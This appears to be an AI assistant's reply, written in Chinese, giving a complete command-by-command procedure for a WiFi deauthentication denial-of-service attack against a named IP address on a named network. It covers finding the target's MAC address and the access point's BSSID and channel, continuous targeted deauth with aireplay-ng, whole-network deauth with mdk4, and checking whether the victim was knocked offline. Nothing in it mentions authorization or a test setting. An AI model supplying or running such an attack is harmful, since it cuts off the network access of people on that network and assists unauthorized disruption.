手动跑 WiFi DoS（和 `wifi4_dos.sh` 一样的逻辑）。目标 `192.168.1.87`，先要知道它连的 **AP 的 BSSID 和信道**。

## 0. 先扫出目标 AP（BSSID + 信道 + 目标MAC）
```bash
TARGET=192.168.1.87
sudo ip link set wlan0 up
sudo nmcli dev wifi connect "ChinaNet-CSKJ"          # 先连到目标所在网
# 解析目标MAC
ping -c1 -W1 $TARGET >/dev/null; sudo arping -c2 -I wlan0 $TARGET >/dev/null 2>&1
TMAC=$(ip neigh show $TARGET | awk '{print $5}'); echo "目标MAC=$TMAC"
```

## 1. 开监听（这步会断本机WiFi，正常）
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0            # 得到 wlan0mon
MON=wlan0mon
sudo ip link set $MON up
```

## 2. 扫出目标 AP 的 BSSID 和信道
```bash
sudo airodump-ng $MON --band abg
# 记下目标所在行: BSSID(如 46:01:B5:D8:71:06) 和 CH(如 6)
```
按 Ctrl-C 退出，把值填进去：
```bash
AP=46:01:B5:D8:71:06
CH=6
```

## 3. 锁信道并发起 deauth
**定向（只踢目标，推荐，和脚本一致）：**
```bash
//让无线网卡工作在与目标 AP 相同的信道；如果信道不一致，就收不到也发不出对应网络的帧
sudo iw dev $MON set channel $CH

sudo aireplay-ng -0 0 -a $AP -c $TMAC $MON
```
**整 BSS（踢该 AP 下所有客户端）：**
```bash
sudo mdk4 $MON d -B $AP
```
（`-0 0` = 一直发，Ctrl-C 停；`-0 10` = 只发 10 个包后退出）

## 4. 收尾（还原）
```bash
#  Ctrl-C 停掉 deauth 后
sudo airmon-ng stop $MON
sudo ip link set wlan0 up
sudo systemctl restart NetworkManager
```

## 5. 判定有没有打掉（要被踢的那台"本身"看）
单卡切监听后本机没法再 ping，所以要**用另一台机器**（同网段）观测：
```bash
# 另一台机器上
ping -i 0.5 -c 60 192.168.1.87
```
- 出现**连续丢包段**（不是零散）→ 目标被踢下线（重连前）；
- 全程几乎不丢 → 目标没受影响（可能忽略 deauth 或瞬间重连）。

## 关键参数速查
| 项 | 值/说明 |
|---|---|
| `-a $AP` | AP 的 BSSID（第二步扫出来的） |
| `-c $TMAC` | 被踢的目标 MAC（去掉 = 踢整 BSS） |
| `-0 N` | 发 N 个 deauth；`0` = 持续发 |
| `$MON` | 监听接口（airmon-ng 起的 `wlan0mon`） |
| 信道 | 必须等于 AP 所在信道，否则打不中 |

> 注：若目标/AP 启用了 **PMF（802.11w）**，`aireplay/mdk4` 的 deauth 会被忽略 → 看起来"没效果"。可用 `tshark` 看 AP 的 `wlan.rsn.capabilities` 是否含 MFPC/MFPR 位来确认。

需要的话我把上面整理成一个不经 ssh、可直接在 Kali 上手敲的 `wifi_dos_manual.md`。